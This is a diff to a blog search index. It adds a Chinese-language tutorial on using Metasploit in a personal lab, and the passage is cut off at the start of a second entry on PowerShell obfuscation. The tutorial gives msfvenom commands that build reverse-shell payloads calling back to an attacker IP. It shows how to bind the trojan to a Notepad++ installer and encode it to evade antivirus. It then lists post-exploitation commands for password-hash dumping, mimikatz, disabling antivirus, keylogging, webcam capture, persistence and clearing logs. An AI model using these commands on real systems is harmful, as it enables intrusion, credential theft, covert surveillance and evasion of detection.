@@ -1,6 +1,78 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Metasploit</title>
+    <url>/posts/1051313787.html</url>
+    <content><![CDATA[<h2 id="Metasploit的免杀和基本使用"><a href="#Metasploit的免杀和基本使用" class="headerlink" title="Metasploit的免杀和基本使用"></a>Metasploit的免杀和基本使用</h2><p>1、在kali里打开Metasploit，创建payload，输入<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=*** lport=*** -f exe -o ***(保存的文件名字及后缀)</code></p>
+<span id="more"></span>
+<p><img src="/posts/1051313787/1.png"></p>
+<p><img src="/posts/1051313787/2.png"><br><br></p>
+<p>2、依次输入以下代码，以开启监听器<br><img src="/posts/1051313787/3.png"><br><br></p>
+<p>3、通过共享文件（hello.exe），主机接受文件发现windows还是会查杀，于是思考对文件进行免杀</p>
+<p>4、在kali里输入<code>msfvenom -l encoders</code>，得到编码列表。<br>注意：这里不是所有的编码方式都可以在windows系统上使用，这里我们将使用x86&#x2F;shikata_ga_nai，它是为数不多评级为excellent的编码<br><img src="/posts/1051313787/4.png"><br><br></p>
+<p>5、我们使用notepad作为木马载体，把木马捆绑在程序上，以便木马的传播<br><img src="/posts/1051313787/5.png"><br><br></p>
+<p>6、输入以下代码来将木马捆绑到notepad上：</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">msfvenom-<span class="selector-tag">p</span> windows/shell_reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">255.130</span> lport=<span class="number">9000</span> </span><br><span class="line">-e x86/shikata_ga_nai -x npp.<span class="number">7.9</span><span class="selector-class">.Installer</span><span class="selector-class">.exe</span> -<span class="selector-tag">i</span> <span class="number">12</span> -f exe -o /home/kali/Desktop/npp<span class="selector-class">.Installer</span>.exe</span><br></pre></td></tr></table></figure>
+<p>这里解释一下其中的部分参数的含义：<br>-e 指定编码方式对攻击载荷进行重新编码<br>-x 指定木马捆绑在哪个可执行程序模版上<br>-i 指定对目标进行编码的次数，多次编码理论上来讲有助于免杀<br>-f 指定MSF编码器输出的程序的格式<br>-o 指定处理完毕后的文件输出路径<br><img src="/posts/1051313787/6.png"><br><br></p>
+<p>7、启动python服务共享文件，发现还是会被查杀。</p>
+<p>8、使用upx对文件进行加壳处理，但是还是不行<br><img src="/posts/1051313787/7.png"><br><br></p>
+<p>9、使用多重编码试图实现免杀，并更改编码次数，甚至更改载体软件，但是最终都以失败告终。<br><img src="/posts/1051313787/8.png"></p>
+<p><img src="/posts/1051313787/9.png"><br><br></p>
+<p>10、于是只能关闭病毒实时查杀进行接下来的实验，免杀这一部分等后面再进行补充。</p>
+<p>11、生成payload，并在本机上接受该exe<br><img src="/posts/1051313787/10.png"><br><br></p>
+<p>12、输入shell切换到目标主机window cmd shell里面，chcp 65001 防止乱码，字符编码65001 是 utf-8，输入exit即可退出shell。<br><img src="/posts/1051313787/11.png"><br><br></p>
+<p>13、从meterpreter退出到MSF框架：输入命令<code>background</code> 把我们获得的meterpreter会话挂载到后台运行。<br><img src="/posts/1051313787/12.png"><br><br></p>
+<p>14、输入session -l（字母L）可以查看所有会话，如果要进入先前的会话，输入sessions -id即可<br><img src="/posts/1051313787/13.png"><br><br></p>
+<p>15、常见命令：</p>
+<pre><code>sysinfo             									#查看目标主机系统信息
+run scraper         									#查看目标主机详细信息
+run hashdump        									#导出密码的哈希
+load kiwi           									#加载mimikatz
+ps                  									#查看目标主机进程信息
+pwd                		 							    #查看目标当前目录(windows)
+getlwd              									#查看目标当前目录(Linux)
+search -f *.jsp -d e:\                					#搜索E盘中所有以.jsp为后缀的文件
+download  e:\test.txt  /root          					#将目标机的e:\test.txt文件下载到/root目录下
+upload    /root/test.txt d:\test      					#将/root/test.txt上传到目标机的 d:\test\ 目录下
+getpid             										#查看当前Meterpreter Shell的进程PID
+migrate 1384        									#将当前Meterpreter Shell的进程迁移到PID为1384的进程上
+idletime           		 								#查看主机运行时间
+getuid              									#查看获取的当前权限
+getsystem           									#提权,获得的当前用户是administrator才能成功
+run  killav        			 							#关闭杀毒软件
+screenshot          									#截图
+webcam_list         									#查看目标主机的摄像头
+webcam_snap         									#拍照
+webcam_stream       									#开视频
+execute 参数 -f 可执行文件   							   #执行可执行程序
+run getgui -u test1 -p Abc123456    					#创建test1用户，密码为Abc123456
+run getgui -e                							#开启远程桌面
+keyscan_start                							#开启键盘记录功能
+keyscan_dump                			 				#显示捕捉到的键盘记录信息
+keyscan_stop                 							#停止键盘记录功能
+uictl  disable  keyboard     							#禁止目标使用键盘
+uictl  enable   keyboard     							#允许目标使用键盘
+uictl  disable  mouse        							#禁止目标使用鼠标
+uictl  enable   mouse        							#允许目标使用鼠标
+load                        							#使用扩展库
+run				             							#使用扩展库
+ 
+run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888        #会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀
+portfwd add -l 9999 -r 192.168.100.158 -p 3389     		                      #将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址
+clearev                                                 #清除日志
+</code></pre>
+<p>16、进入shell输入<code>systeminfo</code>查看目标主机信息<br><img src="/posts/1051313787/14.png"><br><br></p>
+<p>其他的抽时间补充</p>
+]]></content>
+      <categories>
+        <category>web攻防</category>
+      </categories>
+      <tags>
+        <tag>web攻防</tag>
+        <tag>工具使用</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Invoke-obfuscation实现混淆免杀</title>
     <url>/posts/2497940050.html</url>
     <content><![CDATA[<h2 id="方法一：使用powershell进行免杀"><a href="#方法一：使用powershell进行免杀" class="headerlink" title="方法一：使用powershell进行免杀"></a>方法一：使用powershell进行免杀</h2><span id="more"></span>
